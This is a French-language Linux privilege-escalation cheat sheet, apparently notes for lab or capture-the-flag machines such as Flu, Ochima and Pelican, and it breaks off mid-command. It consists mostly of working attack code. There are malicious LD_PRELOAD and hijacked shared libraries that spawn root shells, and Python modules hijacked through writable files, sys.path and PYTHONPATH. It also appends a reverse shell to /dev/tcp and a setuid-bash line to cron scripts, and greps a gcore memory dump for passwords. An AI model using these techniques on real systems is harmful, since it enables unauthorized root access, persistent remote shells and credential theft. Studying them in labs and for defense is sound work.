### Kernel Exploits
> Exploiter des vulnérabilités du noyau Linux

```bash
# Vérifier la version du noyau
uname -a
cat /etc/lsb-release 

# Compiler un exploit
gcc kernel_exploit.c -o kernel_exploit
chmod +x kernel_exploit
./kernel_exploit
```
### Shared Libraries
> Exploiter le chargement de bibliothèques partagées

```bash
# Vérifier LD_PRELOAD dans sudo
sudo -l

# Créer une bibliothèque malveillante
cat << EOF > root.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
EOF
gcc -fPIC -shared -o root.so root.c -nostartfiles

# Exécuter avec LD_PRELOAD
sudo LD_PRELOAD=/tmp/root.so [commande autorisée]
```
### Shared Object Hijacking
> Détourner des objets partagés (.so)

```bash
# Vérifier les bibliothèques utilisées par un binaire
ldd [binaire]

# Vérifier les chemins RUNPATH
readelf -d [binaire] | grep PATH

# Créer une bibliothèque malveillante
cat << EOF > src.c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
EOF
gcc src.c -fPIC -shared -o /chemin/vers/libshared.so
```
### Python Library Hijacking
> Détourner des bibliothèques Python pour élever les privilèges
#### Wrong Write Permissions
```bash
# Vérifier si des modules Python ont des permissions d'écriture incorrectes
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

# Injecter du code malveillant dans une fonction
# Dans __init__.py:
def virtual_memory():
    import os
    os.system('/bin/bash')
    # Code original...
```
#### Library Path
```bash
# Vérifier les chemins Python
python3 -c 'import sys; print("\n".join(sys.path))'

# Créer une bibliothèque malveillante dans un chemin prioritaire
cat << EOF > /usr/lib/python3.8/psutil.py
#!/usr/bin/env python3
import os
def virtual_memory():
    os.system('/bin/bash')
EOF
```
#### PYTHONPATH Environment Variable
```bash
# Vérifier les droits sudo
sudo -l

# Créer un module malveillant
cat << EOF > /tmp/psutil.py
#!/usr/bin/env python3
import os
def virtual_memory():
    os.system('/bin/bash')
EOF

# Exécuter avec PYTHONPATH modifié
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./script.py
```

## Techniques d'élévation de privilèges Linux dans des Box
### Exploitation de tâches cron
Exemple (Flu):
```bash
# Identifier les tâches cron via pspy
./pspy64

# Injecter du code dans un script exécuté par cron
echo 'sh -i >& /dev/tcp/192.168.49.x/9876 0>&1' >> /opt/log-backup.sh
```
Exemple (Ochima):
```bash
# Modifier un script de sauvegarde exécuté par cron
echo "chmod +s /bin/bash" >> /var/backups/etc_Backup.sh
# Attendre l'exécution puis:
/bin/bash -p
```
### Exploitation de processus en mémoire
Exemple (Pelican):
```bash
# Utiliser gcore pour dumper la mémoire d'un processus
sudo /usr/bin/gcore 494
strings core.494 | grep -i pass
```
### Exploitation d'applications Python
Exemple (BitForge, RubyDome):
```bash
# Remplacer un fichier Python exécuté avec sudo
echo 'import os; os.system("
```